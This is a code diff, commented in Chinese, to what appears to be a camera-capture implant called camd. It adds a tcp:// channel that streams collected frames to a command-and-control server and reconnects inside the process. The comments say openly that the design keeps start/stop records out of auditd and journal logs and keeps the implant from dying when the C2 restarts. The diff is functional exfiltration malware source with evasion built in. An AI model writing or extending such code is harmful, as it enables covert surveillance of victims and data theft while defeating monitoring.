@@ -36,6 +36,13 @@
 #include <time.h>
 #include <unistd.h>
 
+#include <arpa/inet.h>
+#include <netdb.h>
+#include <netinet/in.h>
+#include <netinet/tcp.h>
+#include <sys/socket.h>
+#include <sys/types.h>
+
 /* 内置测试密钥：仅当 cfg 未指定时使用。部署必须显式配置。 */
 static const uint8_t DEF_K_SEND[16] = {
     0x0b,0x1c,0x2d,0x3e,0x4f,0x50,0x61,0x72,
@@ -124,7 +131,23 @@ typedef struct {
     uint32_t     batches;
     const char  *name;
     int          last_err;
+
+    /* tcp:// 重连所需。仅当 spec 是 tcp:// 时填充。
+     *
+     * 为何必须进程内重连：
+     *   边采边发时 C2 断线是常态（网络抖动、C2 重启、目标机休眠唤醒）。
+     *   若依赖 systemd 的 Restart=always 兜底，代价是——
+     *     1) 断线期间已采集的帧随进程退出全部丢失；
+     *     2) 每次断线都产生一次进程启停，在 auditd/journal 里留下可关联痕迹；
+     *     3) RestartSec 期间采集完全停摆。
+     *   进程内重连只丢"正在写的那一批"，且不留启停记录。 */
+    char         host[256];
+    char         port[16];
+    uint32_t     reconnects;   /* 成功重连次数，供 status 观测 */
 } cd_sink_t;
+
+/* 前向声明：cd_write_all 定义在前，写失败时要回调重连。 */
+static int cd_sink_reconnect(cd_sink_t *s);
 
 /*
  * 写出信元。
@@ -141,7 +164,19 @@ static int cd_write_all(cd_sink_t *s, const uint8_t *buf, size_t n)
 {
     if (!s || s->sink_fd < 0) return -1;
 
-    if (s->is_sock) return exfil_link_write_all(s->sink_fd, buf, n);
+    if (s->is_sock) {
+        if (exfil_link_write_all(s->sink_fd, buf, n) == 0) return 0;
+
+        /* 写失败且是 tcp:// 出口 → 进程内重连后重试一次。
+         *
+         * 只重试一次，不做循环：下一批采集会自然再试（采集循环自带
+         * interval_ms 节拍），在此处自旋只会空转 CPU 并放大网络压力。
+         * 代价是断开期间这一批帧丢失——可接受，因为重连成功后的批次
+         * 立即恢复，而 systemd 重启方案丢的是整段重启窗口。 */
+        if (s->host[0] && cd_sink_reconnect(s) == 0)
+            return exfil_link_write_all(s->sink_fd, buf, n);
+        return -1;
+    }
 
     size_t off = 0;
     while (off < n) {
@@ -210,7 +245,101 @@ static int cd_exfil(const uint8_t *data, size_t len, const char *name, void *ud)
     return 0;
 }
 
-/* ---- sink 打开：支持 fd://N 与文件路径 ---- */
+/* ---- tcp:// 边采边发 ----
+ *
+ * 背景：此前唯一可用的实时出口是 fd://N（父进程传入已打开的 fd）。这要求
+ * 部署方自己先建好连接再传进来，C2 一断就只能靠外部重启——见 cd_sink_t
+ * 里 reconnects 字段的注释。tcp:// 让 camd 自己建连、自己续连。
+ */
+
+/*
+ * 解析 "tcp://host:port"。
+ *
+ * IPv6 字面量含冒号，用 strrchr 取最后一个冒号而不是 strchr 取第一个，
+ * 否则 "tcp://[::1]:9000" 会被切成 host="[" port="::1]:9000"。
+ * 支持 "[::1]:9000" 的方括号形式，剥掉方括号后再交给 getaddrinfo。
+ */
+static int cd_parse_tcp(const char *spec, char *host, size_t hcap,
+                        char *port, size_t pcap)
+{
+    if (strncmp(spec, "tcp://", 6) != 0) return -1;
+    const char *hp = spec + 6;
+    if (!*hp) return -1;
+
+    const char *colon = strrchr(hp, ':');
+    if (!colon || colon == hp || !colon[1]) return -1;
+
+    size_t plen = strlen(colon + 1);
+    if (plen >= pcap) return -1;
+
+    const char *hs = hp;
+    size_t hlen = (size_t)(colon - hp);
+    if (hlen >= 2 && hs[0] == '[' && colon[-1] == ']') {
+        hs += 1;
+        hlen -= 2;                 /* 剥掉方括号 */
+    }
+    if (hlen == 0 || hlen >= hcap) return -1;
+
+    memcpy(host, hs, hlen); host[hlen] = '\0';
+    memcpy(port, colon + 1, plen); port[plen] = '\0';
+    return 0;
+}
+
+/* 建一条 TCP 连接。成功返回 fd，失败返回 -1。 */
+static int cd_tcp_connect(const char *host, const char *port)
+{
+    struct addrinfo hints, *res = NULL, *ai = NULL;
+    memset(&hints, 0, sizeof hints);
+    hints.ai_socktype = SOCK_STREAM;
+    hints.ai_family   = AF_UNSPEC;      /* 同时接受 v4/v6，由 getaddrinfo 排序 */
+
+    if (getaddrinfo(host, port, &hints, &res) != 0) return -1;
+
+    int fd = -1;
+    for (ai = res; ai; ai = ai->ai_next) {
+        fd = socket(ai->ai_family, ai->ai_socktype, ai->ai_protocol);
+        if (fd < 0) continue;
+
+        /* TCP_NODELAY：信元是 512 字节级小包，Nagle 会攒包，把实时回传
+         * 变成"攒够一批才发"。 */
+        int one = 1;
+        (void)setsockopt(fd, IPPROTO_TCP, TCP_NODELAY, &one, sizeof one);
+
+        /* SO_KEEPALIVE：对端主机断电/断网时本机不会收到 FIN，连接会一直
+         * 挂着，写入也不报错——表现为"在跑但零产出"。保活让它最终报错，
+         * 从而触发下面的进程内重连。 */
+        (void)setsockopt(fd, SOL_SOCKET, SO_KEEPALIVE, &one, sizeof one);
+
+        if (connect(fd, ai->ai_addr, ai->ai_addrlen) == 0) break;
+        close(fd); fd = -1;
+    }
+    freeaddrinfo(res);
+    return fd;
+}
+
+/*
+ * 重连：关掉旧 fd，重新建连。
+ *
+ * 失败即返回 -1，由调用方决定重试节奏。刻意不做无限重试——采集循环本身
+ * 有节拍（interval_ms），下一批会自然再试，无需在此处自旋空转 CPU。
+ */
+static int cd_sink_reconnect(cd_sink_t *s)
+{
+    if (!s->host[0]) return -1;          /* 非 tcp:// 出口，无重连语义 */
+    if (s->sink_owned && s->sink_fd >= 0) close(s->sink_fd);
+    s->sink_fd = -1;
+
+    int fd = cd_tcp_connect(s->host, s->port);
+    if (fd < 0) return -1;
+
+    s->sink_fd   = fd;
+    s->sink_owned = 1;
+    s->is_sock   = 1;
+    s->reconnects++;
+    return 0;
+}
+
+/* ---- sink 打开：支持 fd://N、tcp://host:port 与文件路径 ---- */
 static int cd_sink_open(const char *spec, cd_sink_t *s)
 {
     s->sink_fd = -1;
@@ -222,6 +351,27 @@ static int cd_sink_open(const char *spec, cd_sink_t *s)
         if (n < 0 || n > 65535) return -1;
         s->sink_fd = (int)n;
         s->sink_owned = 0;               /* 不属于本进程，绝不 close */
+        return 0;
+    }
+
+    if (strncmp(spec, "tcp://", 6) == 0) {
+        if (cd_parse_tcp(spec, s->host, sizeof s->host,
+                         s->port, sizeof s->port) != 0) return -1;
+
+        /* SIGPIPE 必须忽略。
+         *
+         * 不是理论风险：C2 进程退出后，本机第一次写入收到 RST，第二次
+         * 写入触发 SIGPIPE，默认动作是**杀死进程**。于是"对端重启一次"
+         * 就等于"植入体静默消失"，而 systemd 的 Restart=always 会把它
+         * 拉起来——表面上自愈了，实际丢了一批帧且留下了启停记录。
+         * 忽略后写入返回 EPIPE，交给下面的进程内重连处理。 */
+        signal(SIGPIPE, SIG_IGN);
+
+        int fd = cd_tcp_connect(s->host, s->port);
+        if (fd < 0) return -1;
+        s->sink_fd    = fd;
+        s->sink_owned = 1;
+        s->is_sock    = 1;
         return 0;
     }
 
